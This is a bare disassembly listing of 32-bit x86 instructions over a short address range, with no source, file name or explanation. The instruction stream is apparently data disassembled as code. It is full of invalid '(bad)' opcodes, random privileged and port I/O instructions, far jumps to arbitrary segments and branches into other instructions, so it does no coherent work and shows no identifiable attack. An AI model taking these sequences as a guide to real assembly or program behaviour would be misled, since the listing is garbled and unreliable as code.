  420363:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420364:	and    ebp,DWORD PTR [edi+0x15]
  420367:	aad    0xe4
  420369:	cld    
  42036a:	or     BYTE PTR [edi-0x1a],cl
  42036d:	lea    ebp,[ebp+0x14]
  420370:	mov    bl,0x3a
  420372:	add    al,0x4e
  420374:	or     eax,0x9173071f
  420379:	or     al,0x36
  42037b:	sbb    eax,0x16a07a29
  420380:	(bad)  
  420381:	xor    BYTE PTR [ecx+0x3b],bl
  420384:	dec    ebx
  420385:	mov    ds:0x919bffe,al
  42038a:	add    BYTE PTR [esi+edx*2],bl
  42038d:	sub    DWORD PTR [ebp-0x3d],edi
  420390:	cwde   
  420391:	mov    ch,dh
  420393:	or     esp,DWORD PTR ds:0xbd63d268
  420399:	fs adc ch,0xa2
  42039d:	pop    es
  42039e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42039f:	test   eax,0x2816fb85
  4203a4:	(bad)  
  4203a6:	or     edx,DWORD PTR [edi-0x3120dfca]
  4203ac:	daa    
  4203ad:	lods   eax,DWORD PTR ds:[esi]
  4203ae:	rcl    esp,0x22
  4203b1:	ins    BYTE PTR es:[edi],dx
  4203b2:	ror    BYTE PTR [ebx],1
  4203b4:	and    ecx,DWORD PTR [edi+0x47]
  4203b7:	xchg   ebp,eax
  4203b8:	and    al,0x68
  4203ba:	dec    esp
  4203bb:	inc    ebp
  4203bc:	test   al,0x3f
  4203be:	pop    esi
  4203bf:	stos   BYTE PTR es:[edi],al
  4203c0:	push   esi
  4203c1:	mov    ebp,0xe0190c29
  4203c6:	cmp    bl,BYTE PTR [edi+ecx*8+0x2ee06830]
  4203cd:	xor    eax,0xeec6fdef
  4203d2:	(bad)  
  4203d3:	or     al,0x1e
  4203d5:	mov    cl,bh
  4203d7:	add    BYTE PTR [eax-0x51923830],dl
  4203dd:	int    0x8f
  4203df:	mov    cl,0xea
  4203e1:	dec    ebp
  4203e2:	mov    eax,ds:0x1adc27cc
  4203e7:	xchg   esi,eax
  4203e8:	(bad)  
  4203e9:	mov    eax,ds:0xa633073b
  4203ee:	sub    eax,0x90b309a4
  4203f3:	lahf   
  4203f4:	ret    0xb42d
  4203f7:	pop    edx
  4203f8:	jl     0x4203ca
  4203fa:	dec    ecx
  4203fb:	(bad)  
  4203fc:	hlt    
  4203fd:	and    DWORD PTR [edx+ebp*4+0x432711ad],edi
  420404:	add    esp,DWORD PTR [edx-0x69487abb]
  42040a:	jb     0x4203da
  42040c:	or     DWORD PTR [edi+0x47],ebx
  42040f:	inc    ebx
  420410:	xor    BYTE PTR [ebx],bh
  420412:	pop    esp
  420413:	js     0x420422
  420415:	hlt    
  420416:	adc    DWORD PTR [ecx],edi
  420418:	xchg   esp,eax
  420419:	inc    edx
  42041a:	into   
  42041b:	cmp    ch,bh
  42041d:	pop    edx
  42041e:	and    ecx,ebp
  420420:	mov    WORD PTR [ebx+0x4584d641],?
  420426:	mov    eax,ds:0x532f4a14
  42042b:	xor    cl,ch
  42042d:	fdiv   st(1),st
  42042f:	pop    ds
  420430:	dec    eax
  420431:	mov    bl,dh
  420433:	frstor [edx+eax*1-0x4f657972]
  42043a:	mov    ds:0xf0072b77,al
  42043f:	addr16 inc eax
  420441:	fldcw  WORD PTR [eax]
  420443:	int    0x29
  420445:	scas   eax,DWORD PTR es:[edi]
  420446:	mov    dh,0x24
  420448:	das    
  420449:	inc    esp
  42044a:	pop    esp
  42044b:	rcl    BYTE PTR [eax+0x2b],cl
  42044e:	adc    al,0x63
  420450:	pop    eax
  420451:	call   0xe1146bf5
  420456:	retf   0xdbab
  420459:	cmp    BYTE PTR [eax+0x55],0xa0
  42045d:	(bad)  
  42045e:	sub    DWORD PTR [edi+0x2bc3c47c],esi
  420464:	adc    dl,BYTE PTR [eax+0x43]
  420467:	adc    ch,ch
  420469:	sub    eax,0xf843af6a
  42046e:	xlat   BYTE PTR ds:[ebx]
  42046f:	in     eax,dx
  420470:	mov    edx,0x31b93070
  420475:	sbb    ecx,DWORD PTR [edi+0x11d14188]
  42047b:	ins    BYTE PTR es:[edi],dx
  42047c:	add    DWORD PTR [edx-0x48609757],edx
  420482:	popa   
  420483:	sti    
  420484:	inc    ebp
  420485:	mov    esp,edx
  420487:	shl    DWORD PTR [ebx],cl
  420489:	or     BYTE PTR [ecx],dh
  42048b:	(bad)  
  42048d:	dec    esi
  42048e:	push   ecx
  42048f:	into   
  420490:	loopne 0x42046a
  420492:	(bad)  
  420493:	mov    ecx,0x713273c1
  420498:	cmp    esp,DWORD PTR [esi]
  42049a:	bound  esp,QWORD PTR [ecx+0x6ead73ab]
  4204a0:	pop    es
  4204a1:	lods   eax,DWORD PTR ds:[esi]
  4204a2:	das    
  4204a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4204a4:	add    bx,dx
  4204a7:	out    0x57,eax
  4204a9:	imul   edi,edx,0xd
  4204ac:	(bad)  
  4204ad:	jmp    0x3a3e:0x81defc1a
  4204b4:	icebp  
  4204b5:	add    ecx,edx
  4204b7:	mov    ecx,DWORD PTR [edx-0x64]
  4204ba:	sbb    al,0x73
  4204bc:	pop    esp
  4204bd:	out    dx,eax
  4204be:	push   eax
  4204bf:	mov    ds:0x6189669a,al
  4204c4:	or     eax,0x118bc9fc
  4204c9:	fistp  QWORD PTR [ebx-0x54e4f3d1]
  4204cf:	repz call 0x89c00499
  4204d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4204d6:	sahf   
  4204d7:	mov    ecx,0x776ea1b5
  4204dc:	hlt    
  4204dd:	add    eax,0x55eda19a
  4204e2:	scas   eax,DWORD PTR es:[edi]
  4204e3:	retf   
  4204e4:	iret   
  4204e5:	cs push ss
  4204e7:	mov    edi,0xfbaa81e1
  4204ec:	setne  BYTE PTR [edi-0x4d]
  4204f0:	inc    edx
  4204f1:	test   eax,0xd85951a7
  4204f6:	add    al,0xb6
  4204f8:	stos   DWORD PTR es:[edi],eax
  4204f9:	sar    BYTE PTR [ebx-0x53],0x6a
  4204fd:	scas   al,BYTE PTR es:[edi]
  4204fe:	pusha  
  4204ff:	push   ebp
  420500:	push   es
  420501:	into   
  420502:	fwait
  420503:	cmp    DWORD PTR [ebx+0x27779bdf],esp
  420509:	arpl   cx,di
  42050b:	test   al,0x4f
  42050d:	mov    ebx,fs
  42050f:	pop    ss
  420510:	repz mov ebp,0x9d711d1b
  420516:	rcr    BYTE PTR [esi+0x4b],1
  420519:	inc    esp
  42051a:	inc    esi
  42051b:	jge    0x420593
  42051d:	jae    0x420537
  42051f:	ins    BYTE PTR es:[edi],dx
  420520:	jecxz  0x4204b6
  420522:	stos   BYTE PTR es:[edi],al
  420523:	or     al,0xb1
  420525:	out    dx,al
  420526:	imul   esi,ebx,0x88c5b248
  42052c:	ins    DWORD PTR es:[edi],dx
  42052d:	cmp    esi,ebx
  42052f:	lock gs in eax,0x91
  420533:	xor    eax,0xce4cd089
  420538:	loope  0x4205ae
  42053a:	arpl   WORD PTR [edx-0x6272f7bb],cx
  420540:	jae    0x420505
  420542:	add    dh,BYTE PTR [edx-0x6]
  420545:	ja     0x4204fb
  420547:	out    dx,al
  420548:	repnz push 0x18
  42054b:	inc    esi
  42054c:	das    
  42054d:	lods   al,BYTE PTR ds:[esi]
  42054e:	xchg   ebp,eax
  42054f:	and    esi,esp
  420551:	das    
  420552:	fidiv  WORD PTR ds:0x12bef0fe
  420558:	or     dl,BYTE PTR [edx+0x318a00b0]
  42055e:	and    al,0x8c
  420560:	mov    dh,BYTE PTR ss:[ebx-0x5b]
  420564:	neg    DWORD PTR ds:0xe6748851
  42056a:	add    dh,BYTE PTR ds:0x88f4723f
  420570:	in     al,0xe1
  420572:	sar    BYTE PTR [eax],cl
  420574:	push   cs
  420575:	cs push esp
  420577:	mov    ebx,0x7528be58
  42057c:	inc    edx
  42057d:	add    ebp,edi
  42057f:	push   cs
  420580:	or     al,BYTE PTR [eax-0xabe577c]
  420586:	std    
  420587:	or     eax,0x48c23cbf
  42058c:	punpckhdq mm4,QWORD PTR [eax]
  42058f:	xor    ah,BYTE PTR [ebp-0x2dfb6ad4]
  420595:	call   0xd9f:0xef13b01c
  42059c:	in     al,0x41
  42059e:	fwait
  42059f:	xor    dh,bl
  4205a1:	ret    
  4205a2:	dec    edi
  4205a3:	ds xor bh,cl
  4205a6:	mov    ebx,0x1aa3907a
  4205ab:	mov    ds:0x20142c91,al
  4205b0:	enter  0x81ff,0xa7
  4205b4:	fst    QWORD PTR [ebx-0x13495209]
  4205ba:	fimul  WORD PTR ds:0xf04e8ee9
  4205c0:	dec    eax
  4205c1:	adc    ah,cl
  4205c3:	add    eax,0x1a9db0df
  4205c8:	out    dx,eax
  4205c9:	add    bl,ah
  4205cb:	dec    edi
  4205cc:	in     eax,0x92
  4205ce:	ror    DWORD PTR [ebx],0x22
  4205d1:	hlt    
  4205d2:	loopne 0x4205ee
  4205d4:	lods   eax,DWORD PTR ds:[esi]
  4205d5:	add    edi,ebx
  4205d7:	stc    
  4205d8:	add    dl,BYTE PTR [ebp-0x1a3defc2]
  4205de:	pop    ds
  4205df:	cs or  al,0xce
  4205e2:	add    DWORD PTR [ecx-0x6f],ebx
  4205e5:	adc    al,0x2c
  4205e7:	pop    bp
  4205e9:	or     DWORD PTR [esi+0x43],eax
  4205ec:	das    
  4205ed:	sub    BYTE PTR [edi+0x6d597d0b],dl
  4205f3:	mul    DWORD PTR [ebp-0x1ec41711]
  4205f9:	jmp    DWORD PTR [edx]
  4205fb:	jp     0x420594
  4205fd:	jg     0x420679
  4205ff:	mov    BYTE PTR [esi-0x77],dl
  420602:	mov    bl,0x83
  420604:	fldenv [edi+0x72dddfc6]
  42060a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42060b:	enter  0x49e2,0xf1
  42060f:	jp     0x420680
  420611:	xlat   BYTE PTR ds:[ebx]
  420612:	retf   
  420613:	fidiv  DWORD PTR [edx+ebp*8+0x12f70093]
  42061a:	out    dx,eax
  42061b:	or     al,0x2b
  42061d:	push   ds
  42061e:	fld    DWORD PTR [edi-0x2b]
  420621:	into   
  420622:	popf   
  420623:	retf   
  420624:	mov    ss,WORD PTR [esp+ecx*2]
  420627:	inc    edx
  420628:	mov    edx,0xe19a95c2
  42062d:	nop
  42062e:	sub    bl,al
  420630:	fbld   TBYTE PTR [ebp+ebp*2-0x39dd6cd8]
  420637:	mov    dl,ch
  420639:	sbb    dh,0xed
  42063c:	cwde   
  42063d:	xchg   DWORD PTR [esi],edx
  42063f:	or     DWORD PTR [edi-0x67],eax
  420642:	int    0x6d
  420644:	adc    esi,esi
  420646:	cmp    DWORD PTR [edx+0x49e84982],0xffffffef
  42064d:	pop    ebx
  42064e:	inc    edx
  42064f:	sbb    eax,0x34450914
  420654:	ds mov ebx,0xfd68922c
  42065a:	dec    edx
  42065b:	add    ebp,DWORD PTR [ebp+0xe]
  42065e:	sub    al,0x30
  420660:	mov    dh,0xec
  420662:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420663:	mov    ah,0x30
  420665:	cld    
  420666:	and    ah,bl
  420668:	in     eax,dx
  420669:	inc    edi
  42066a:	dec    eax
  42066b:	sti    
  42066c:	sub    eax,0x5f8d437c
  420671:	pusha  
  420672:	xor    eax,0x2417d789
  420677:	push   edx
  420678:	mov    WORD PTR [esi+0x3f],fs
  42067b:	(bad)  
  42067c:	lahf   
  42067d:	hlt    
  42067e:	jno    0x420604
  420680:	repz das 
  420682:	xchg   ebx,eax
  420683:	int3   
  420684:	mov    esi,0x736685c7
  420689:	mov    BYTE PTR [esi-0x1e],ch
  42068c:	shl    edx,cl
  42068e:	addr16 adc esi,ecx
  420691:	setne  ah
  420694:	push   0x7ae605b2
  420699:	les    esi,FWORD PTR [ebp+0x431048b1]
  42069f:	and    eax,0x6e8f8706
  4206a4:	nop
  4206a5:	test   DWORD PTR [esi],ebp
  4206a7:	sub    al,0x2
  4206a9:	xor    bh,BYTE PTR [eax+0x3e]
  4206ac:	xchg   ebp,eax
  4206ad:	inc    ecx
  4206ae:	pushf  
  4206af:	imul   edx,DWORD PTR [ecx-0x16bd5aee],0xc9b569cf
  4206b9:	add    ch,BYTE PTR [esi+0x39]
  4206bc:	stos   DWORD PTR es:[edi],eax
  4206bd:	clc    
  4206be:	jno    0x4206b1
  4206c0:	mov    al,0xbc
  4206c2:	and    DWORD PTR [ebx+0x3d33c3c0],ebp
  4206c8:	push   0x4c645fc8
  4206cd:	call   0xb0d7e13c
  4206d2:	test   eax,0xc01579b7
  4206d7:	rol    DWORD PTR [ecx+0x4d],0xa1
  4206db:	ss mov dl,0x6c
  4206de:	adc    DWORD PTR [edi-0x24],ebx
  4206e1:	fs dec eax
  4206e3:	and    esp,DWORD PTR [edi]
  4206e5:	pop    ss
  4206e6:	sbb    eax,DWORD PTR [edx]
  4206e8:	les    eax,FWORD PTR [edx-0x20]
  4206eb:	dec    edi
  4206ec:	and    DWORD PTR [esi-0x62a2d5b5],ebp
  4206f2:	inc    edx
  4206f3:	jmp    0x6459e9bb
  4206f8:	inc    edx
  4206f9:	mov    ah,BYTE PTR [ebp+eax*4+0x25]
  4206fd:	cli    
  4206fe:	(bad)  
  4206ff:	push   ecx
  420700:	rol    eax,0x61
  420703:	xor    DWORD PTR [esi],eax
  420705:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420706:	idiv   DWORD PTR [ecx-0x38eaba1e]
  42070c:	xor    al,0x47
  42070e:	sub    bl,BYTE PTR [ebx+ecx*8]
  420711:	(bad)  
  420712:	popf   
  420713:	retf   0x4a0a
  420716:	fdivr  st(2),st
  420718:	(bad)  
  420719:	pop    ebp
  42071a:	push   esi
  42071b:	loop   0x420759
  42071d:	push   esi
  42071e:	mov    esp,0x112d77a8
  420723:	dec    ebx
  420724:	enter  0x6a6a,0x5b
  420728:	and    eax,0xed0e662c
  42072d:	ds loope 0x42074a
  420730:	fneni(8087 only) 
  420732:	xchg   ebp,eax
  420733:	pop    eax
  420734:	js     0x4206ff
  420736:	sar    DWORD PTR [ecx+0x15793d45],cl
  42073c:	jo     0x4206bf
  42073e:	sbb    esi,DWORD PTR [eax]
  420740:	mov    ch,0x6a
  420742:	cmp    DWORD PTR [edi-0x3ba3cb7b],ecx
  420748:	push   0xc716deda
  42074d:	mov    ds:0xcc75f736,eax
  420752:	mov    BYTE PTR [ecx+0x46],cl
  420755:	xchg   edx,eax
  420756:	out    0xbc,eax
  420758:	sub    esi,ecx
  42075a:	jbe    0x4206e1
  42075c:	fsub   st(3),st
  42075e:	push   0x5b
  420760:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420761:	pop    ebx
  420762:	in     eax,dx
  420763:	call   0xe4a57ff3
  420768:	cmc    
  420769:	stc    
  42076a:	cwde   
  42076b:	pop    ecx
  42076c:	mov    esi,0x89f85576
  420771:	outs   dx,BYTE PTR ds:[esi]
  420772:	xor    ecx,DWORD PTR [edi]
  420774:	adc    bl,al
  420776:	bound  esp,QWORD PTR [esi+0x32faf74d]
  42077c:	push   0xbe9043ba
  420781:	sahf   
  420782:	xor    al,0x22
  420784:	test   BYTE PTR [edx+0x3a],ah
  420787:	lahf   
  420788:	mov    bh,0xdc
  42078b:	sbb    edx,edi
  42078d:	adc    esi,edi
  42078f:	test   eax,0x3938561f
  420794:	int3   
  420795:	sub    BYTE PTR [edx+0x5e],ch
  420798:	scas   al,BYTE PTR es:[edi]
  420799:	retf   
  42079a:	pop    ebp
  42079b:	dec    esp
  42079c:	into   
  42079d:	jp     0x4207e1
  42079f:	push   ebp
  4207a0:	ror    ah,0x58
  4207a3:	cmc    
  4207a4:	aaa    
  4207a5:	inc    ebp
  4207a6:	cmc    
  4207a7:	addr16 enter 0x60de,0xbb
  4207ac:	or     eax,0xde99f5c7
  4207b1:	add    eax,0xcd20fdb3
  4207b6:	inc    esp
  4207b7:	int    0xf0
  4207b9:	call   0x98a2da28
  4207be:	out    0x45,al
  4207c0:	and    ecx,0x31
  4207c3:	enter  0x142,0x79
  4207c7:	iret   
  4207c8:	mov    dh,0xe8
  4207ca:	(bad)  
  4207cb:	aad    0x9c
  4207cd:	pop    esi
  4207ce:	out    0xc0,al
  4207d0:	sub    DWORD PTR [edx],eax
  4207d2:	or     ebx,DWORD PTR [esi]
  4207d4:	inc    ecx
  4207d5:	sub    al,0x9b
  4207d7:	adc    al,0x70
  4207d9:	iret   
  4207da:	cmp    BYTE PTR [ecx-0x14],0x59
  4207de:	cld    
  4207df:	ror    DWORD PTR [ecx-0x2a],0x9e
  4207e3:	inc    ebx
  4207e4:	sub    BYTE PTR [esi],bh
  4207e6:	mov    dl,0x79
  4207e8:	scas   al,BYTE PTR es:[edi]
  4207e9:	hlt    
  4207ea:	in     eax,0x2a
  4207ec:	sahf   
  4207ed:	cmp    eax,0xf73492
  4207f2:	pop    eax
  4207f3:	add    cl,al
  4207f5:	add    ebx,edx
  4207f7:	das    
  4207f8:	into   
  4207f9:	jns    0x420856
  4207fb:	add    eax,0x608b2289
  420800:	dec    ebx
  420801:	cdq    
  420802:	inc    ebx
  420803:	xor    edi,DWORD PTR [edx-0x4ca714ec]
  420809:	lock pop ecx
  42080b:	sub    edx,DWORD PTR [ecx-0x50]
  42080e:	mov    eax,0x342fcfe0
  420813:	jmp    0x42083b
  420815:	pop    edx
  420816:	in     eax,dx
  420817:	sub    al,0x5e
  420819:	mov    edi,0x6e1b3ce9
  42081e:	into   
  42081f:	clc    
  420820:	fs shl eax,0x5c
  420824:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420825:	ret    0x3112
  420828:	jmp    0x8226:0x82835639
  42082f:	inc    ebx
  420831:	xor    al,0xa3
  420833:	lods   al,BYTE PTR ds:[esi]
  420834:	inc    ebp
  420835:	mov    ch,0xef
  420837:	add    DWORD PTR [ebp+eiz*4+0x67],edi
  42083b:	lds    edi,FWORD PTR [esi+0x64485a6c]
  420841:	je     0x420834
  420843:	push   ebp
  420844:	sbb    BYTE PTR [eax],0xa6
  420847:	sbb    al,BYTE PTR [edi+0x1d]
  42084a:	sub    DWORD PTR [esi],ebx
  42084c:	push   esp
  42084d:	pop    ss
  42084e:	paddb  mm2,mm5
  420851:	adc    DWORD PTR [eax+0x7f],ecx
  420854:	cmp    eax,0x45944e7d
  420859:	or     eax,0x98013749
  42085e:	sub    eax,0x219666c7
  420863:	ins    BYTE PTR es:[edi],dx
  420864:	mov    dl,0x4e
  420866:	cs call 0x895:0x7d6af3bd
  42086e:	test   eax,0x33dce548
  420873:	bound  ebx,QWORD PTR [ecx-0x102db14]
  420879:	or     eax,0x39683024
  42087e:	xor    dl,cl
  420880:	lods   al,BYTE PTR ds:[esi]
  420881:	dec    edi
  420882:	or     eax,0x728add7e
  420887:	mov    dh,0x67
  420889:	pop    ds
  42088a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42088b:	rcr    DWORD PTR [esi-0x7c204675],cl
  420891:	stos   BYTE PTR es:[edi],al
  420892:	aam    0x94
  420894:	push   ds
  420895:	out    0x9d,al
  420897:	inc    edi
  420898:	sbb    cl,BYTE PTR [esi-0x7b14b54e]
  42089e:	outs   dx,DWORD PTR ds:[esi]
  42089f:	jnp    0x42087c
  4208a1:	rcl    DWORD PTR [edx-0x5a30b4f2],1
  4208a7:	sbb    DWORD PTR [eax],edi
  4208a9:	sbb    BYTE PTR [ecx-0x5d1ea8a0],0x90
  4208b0:	or     edx,eax
  4208b2:	cmp    ebx,esi
  4208b4:	out    dx,al
  4208b5:	mov    bh,BYTE PTR [edx-0x3]
  4208b8:	addr16 jmp 0xb142:0x826089df
  4208c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4208c1:	les    ebx,FWORD PTR [edi+0x3]
  4208c4:	lea    esp,[eax]
  4208c6:	jle    0x4208fd
  4208c8:	mov    ebp,0x497fc08
  4208cd:	mov    ebx,0xea87673a
  4208d2:	sbb    al,0xeb
  4208d4:	call   0x8aea1991
  4208d9:	(bad)  
  4208da:	imul   BYTE PTR [ebp-0x1]
  4208dd:	pushf  
  4208de:	outs   dx,DWORD PTR ds:[esi]
  4208df:	push   ds
  4208e0:	sbb    DWORD PTR [ebx-0x66],edx
  4208e3:	sbb    al,0x82
  4208e5:	mov    esp,0x6c787e6c
  4208ea:	pop    ebx
  4208eb:	int3   
  4208ec:	fsubr  st(1),st
  4208ee:	jecxz  0x420961
  4208f0:	loope  0x42092d
  4208f2:	cmp    eax,0x80068035
  4208f7:	sbb    al,0x67
  4208f9:	pop    es
  4208fa:	cdq    
  4208fb:	cmp    al,0x82
  4208fd:	mov    edi,DWORD PTR [edx+0x134f1ef8]
  420903:	dec    edx
  420904:	push   esi
  420905:	mov    esi,0x9945977f
  42090a:	dec    esp
  42090b:	jne    0x4208a9
  42090d:	out    dx,eax
  42090e:	fcmovnb st,st(5)
  420910:	addr16 mov dh,0xdd
  420913:	call   0xb78d:0x9cbb36a7
  42091a:	mov    BYTE PTR [ebp+0x19],bh
  42091d:	adc    cl,dh
  42091f:	lds    ebx,FWORD PTR [eax-0x44]
  420922:	dec    edi
  420923:	lds    esp,FWORD PTR [ebp-0x3bcff717]
  420929:	or     eax,0x1c19d9e0
  42092e:	(bad)  
  42092f:	mov    al,ds:0x3ca8cf9e
  420934:	or     ch,BYTE PTR [ebx-0x37ace942]
  42093a:	xchg   ebx,eax
  42093b:	dec    edx
  42093c:	jecxz  0x420921
  42093e:	icebp  
  42093f:	fs scas al,BYTE PTR es:[edi]
  420941:	sbb    DWORD PTR [edi-0x2e26f6eb],0x9182f51b
  42094b:	dec    ax
  42094d:	inc    edi
  42094e:	neg    DWORD PTR [eax+0x64]
  420951:	pop    edx
  420952:	inc    ebx
  420953:	cmp    al,0xa9
  420955:	(bad)  
  420956:	cld    
  420957:	imul   edi,edx,0xffffffce
  42095a:	bound  eax,QWORD PTR [edx+0x7e9b81e9]
  420960:	jmp    0x96da:0xa3bb9725
  420967:	or     ah,ch
  420969:	jg     0x420935
  42096b:	es cdq 
  42096d:	ins    DWORD PTR es:[edi],dx
  42096e:	js     0x420903
  420970:	(bad)  
  420971:	es aad 0x3c
  420974:	inc    DWORD PTR [eax-0x4]
  420977:	pop    esp
  420978:	pop    ebx
  420979:	xor    BYTE PTR [edx+0x4c],0x9d
  42097d:	lods   al,BYTE PTR ds:[esi]
  42097e:	and    al,dh
  420980:	rcr    DWORD PTR [eax+edi*8],1
  420983:	cmp    eax,0xb8c9be66
  420988:	bnd je 0x4209e8
  42098b:	jmp    0x420957
  42098d:	jno    0x420924
  42098f:	mov    ss,WORD PTR [edi-0x61]
  420992:	xor    dl,BYTE PTR [edx+ecx*1-0x32]
  420996:	adc    BYTE PTR [ecx-0x4a64a846],al
  42099c:	setle  ah
  42099f:	push   ss
  4209a0:	int3   
  4209a1:	lahf   
  4209a2:	dec    edx
  4209a3:	push   ecx
  4209a4:	lahf   
  4209a5:	add    ecx,0xffffffb3
  4209a8:	ror    DWORD PTR [eax],1
  4209aa:	or     bh,BYTE PTR [ebx]
  4209ac:	jl     0x420944
  4209ae:	cmp    edi,edi
  4209b0:	xor    al,0xd4
  4209b2:	pop    ecx
  4209b3:	nop
  4209b4:	or     ecx,DWORD PTR [esi-0x3c98e41c]
  4209ba:	mov    dl,0x48
  4209bc:	mov    edi,0xc460a798
  4209c1:	ins    BYTE PTR es:[edi],dx
  4209c2:	shr    DWORD PTR [edi],cl
  4209c4:	call   0xd73fba28
  4209c9:	push   edx
  4209ca:	imul   edi,esp,0x1e
  4209cd:	sbb    DWORD PTR [edx],0x57
  4209d0:	xchg   ebp,eax
  4209d1:	imul   esp,DWORD PTR [ecx],0x534310fd
  4209d7:	and    BYTE PTR [ecx+0x5fdf5ed5],ch
  4209dd:	mov    sp,0xf678
  4209e1:	scas   al,BYTE PTR es:[edi]
  4209e2:	cmc    
  4209e3:	loop   0x420967
  4209e5:	sbb    esi,DWORD PTR [ebp-0x73df78a6]
  4209eb:	lods   al,BYTE PTR ds:[esi]
  4209ec:	fimul  WORD PTR [ebx-0x61]
  4209ef:	mov    ds:0xf741ffeb,al
  4209f4:	push   edi
  4209f5:	mov    ecx,0x860bd963
  4209fa:	fistp  WORD PTR [ecx]
  4209fc:	ficomp DWORD PTR [ebp-0x59]
  4209ff:	mov    ecx,0xbb64aeed
  420a04:	aad    0xde
  420a06:	(bad)  
  420a07:	icebp  
  420a08:	jecxz  0x420a7b
  420a0a:	retf   0xc88e
  420a0d:	out    dx,al
  420a0e:	gs in  eax,0x7a
  420a11:	ja     0x4209af
  420a13:	les    esi,FWORD PTR [eax+0x37ee4a54]
  420a19:	lods   eax,DWORD PTR ds:[esi]
  420a1a:	(bad)  
  420a1b:	into   
  420a1c:	fsub   QWORD PTR [ecx-0x1f209c0f]
  420a22:	cwde   
  420a23:	push   0x88bdf126
  420a28:	les    ebx,FWORD PTR [ebx]
  420a2a:	push   ebp
  420a2b:	repnz cmc 
  420a2d:	push   ebx
  420a2e:	popf   
  420a2f:	and    edi,DWORD PTR [ebx-0x55]
  420a32:	nop
  420a33:	cdq    
  420a34:	pop    edx
  420a35:	pop    edx
  420a36:	xlat   BYTE PTR ds:[ebx]
  420a37:	mov    bl,0x97
  420a39:	pop    edx
  420a3a:	sbb    al,0x7b
  420a3c:	sbb    al,0xad
  420a3e:	sbb    al,0x74
  420a40:	inc    edi
  420a41:	outs   dx,DWORD PTR ds:[esi]
  420a42:	mov    bl,0xbc
  420a44:	addr16 pop esp
  420a46:	fs jmp 0x420a06
  420a49:	rcr    DWORD PTR [edi+0x29f769bc],1
  420a4f:	icebp  
  420a50:	mov    esi,0xbb6033ff
  420a55:	pop    esi
  420a56:	in     eax,dx
  420a57:	fs and ax,bp
  420a5b:	add    BYTE PTR [esi-0x2d],bl
  420a5e:	js     0x420abc
  420a60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420a61:	daa    
  420a62:	inc    edx
  420a63:	cmp    edi,DWORD PTR [ebx+0x6e8bd0ab]
  420a69:	int3   
  420a6a:	cmp    ch,al
  420a6c:	ds jo  0x420acf
  420a6f:	push   0x92ae95fb
  420a74:	mov    eax,0xd61f317
  420a79:	arpl   bx,bx
  420a7b:	leave  
  420a7c:	jb     0x420a50
  420a7e:	xchg   DWORD PTR [eax+0x31],ecx
  420a81:	xor    edx,DWORD PTR [ebx+0x60]
  420a84:	push   esp
  420a85:	out    0x12,al
  420a87:	jo     0x420a44
  420a89:	aam    0xce
  420a8b:	mov    esi,DWORD PTR [esi]
  420a8d:	jne    0x420a98
  420a8f:	sbb    DWORD PTR [eax+0x360f2d8b],ecx
  420a95:	(bad)
  420a98:	or     esi,DWORD PTR [ebp*2-0x68a39d0]
  420a9f:	push   ebp
  420aa0:	mov    ah,0xfc
  420aa2:	pop    edx
  420aa3:	xchg   esp,eax
  420aa4:	fst    DWORD PTR [ebx]
  420aa6:	es inc eax
  420aa8:	xor    eax,0xa43a0c6f
  420aad:	call   0xaf694cf5
  420ab2:	lds    eax,FWORD PTR [esi+ebp*8+0x9]
  420ab6:	push   ss
  420ab7:	dec    ebx
  420ab8:	pop    ebx
  420ab9:	dec    edi
  420aba:	cmp    cl,ah
  420abc:	fdiv   DWORD PTR [edx+0x4f]
  420abf:	mov    eax,0x35e82df2
  420ac4:	fmul   QWORD PTR [ebx-0x345a8f9d]
  420aca:	mov    DWORD PTR [ebp-0x1a],esi
  420acd:	in     eax,dx
  420ace:	xchg   edx,eax
  420acf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420ad0:	jno    0x420b39
  420ad2:	aaa    
  420ad3:	test   DWORD PTR [ecx+ecx*8+0x59],ebx
  420ad7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420ad8:	push   ebx
  420ad9:	xor    eax,0x96774522
  420ade:	sub    DWORD PTR [ebx-0x53dbd657],eax
  420ae4:	sbb    ecx,esp
  420ae6:	pop    esi
  420ae7:	xchg   esi,eax
  420ae8:	fcomi  st,st(0)
  420aea:	jp     0x420b1c
  420aec:	fsubr  st(7),st
  420aee:	test   al,0xe0
  420af0:	push   esp
  420af1:	scas   al,BYTE PTR es:[edi]
  420af2:	jno    0x420a79
  420af4:	cdq    
  420af5:	(bad)  
  420af6:	dec    ebx
  420af7:	inc    ebp
  420af8:	and    al,0xc6
  420afa:	rcl    DWORD PTR [esi],0x8a
  420afd:	push   0x771c1d86
  420b02:	mov    edx,0xe5805391
  420b07:	jmp    0xf5286c38
  420b0c:	test   al,0xb9
  420b0e:	imul   ecx,DWORD PTR [eax-0x2a],0x66b1a911
  420b15:	fld    QWORD PTR [edi-0x5b]
  420b18:	push   eax
  420b19:	hlt    
  420b1a:	in     eax,dx
  420b1b:	and    DWORD PTR [edx-0x43],ebx
  420b1e:	scas   al,BYTE PTR es:[edi]
  420b1f:	shl    DWORD PTR [esi+edx*1-0x675f4f18],cl
  420b26:	sbb    eax,0x5b583e2e
  420b2b:	rcr    al,cl
  420b2d:	int    0x79
  420b2f:	add    edi,DWORD PTR [ecx-0x7c]
  420b32:	sub    bh,BYTE PTR [edi-0x6f]
  420b35:	and    DWORD PTR [eax+0x568ede23],ebx
  420b3b:	sub    ah,BYTE PTR [ecx]
  420b3d:	clc    
  420b3e:	and    ebx,DWORD PTR [ecx-0x19]
  420b41:	push   ecx
  420b42:	bound  ebp,QWORD PTR [edx]
  420b44:	dec    ecx
  420b45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420b46:	jns    0x420b0a
  420b48:	scas   al,BYTE PTR es:[edi]
  420b49:	and    bl,BYTE PTR [eax-0x11961054]
  420b4f:	mov    cl,0xaf
